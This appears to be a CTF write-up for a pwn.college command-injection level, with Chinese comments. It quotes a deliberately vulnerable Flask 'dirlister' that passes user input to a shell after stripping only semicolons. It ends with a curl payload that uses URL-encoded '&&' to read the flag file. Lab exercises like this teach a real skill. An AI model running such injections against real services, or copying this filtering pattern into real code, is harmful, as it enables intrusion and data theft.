@@ -1,0 +1,47 @@
+#CMDi 2
+#挑战简介
+Many developers are aware of things like command injection, and try to prevent it. In this level, you may not use ;
+! Can you think of another way to command-inject? Recall what you learned in the Piping module of the Linux Luminarium...
+
+#cat /challenge/server
+#!/opt/pwn.college/python
+
+import subprocess
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+@app.route("/", methods=["GET", "POST"])
+def challenge():
+    directory = flask.request.args.get("directory", "/challenge").replace(";", "")
+    command = f"ls -l {directory}"
+    print(f"DEBUG: {command=}")
+    listing = subprocess.run(
+        command,                    # the command to run
+        shell=True,                 # use the shell to run this command
+        stdout=subprocess.PIPE,     # capture the standard output
+        stderr=subprocess.STDOUT,   # 2>&1
+        encoding="latin"            # capture the resulting output as text
+    ).stdout
+
+    return f"""
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form><input type=text name=directory><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of: ls -l {directory}</b><br>
+        <pre>{listing}</pre>
+        </body></html>
+        """
+
+os.setuid(os.geteuid())
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+app.secret_key = os.urandom(8)
+port = 8080 if os.geteuid() else 80
+app.config['SERVER_NAME'] = f"challenge.localhost:{port}"
+app.run("challenge.localhost", port)
+
+#因此我们选择用'&&'
+#对'&&'编码得'%26%26'
+curl -v "http://challenge.localhost/?directory=/challenge%26%26cat%20/challenge/../flag"
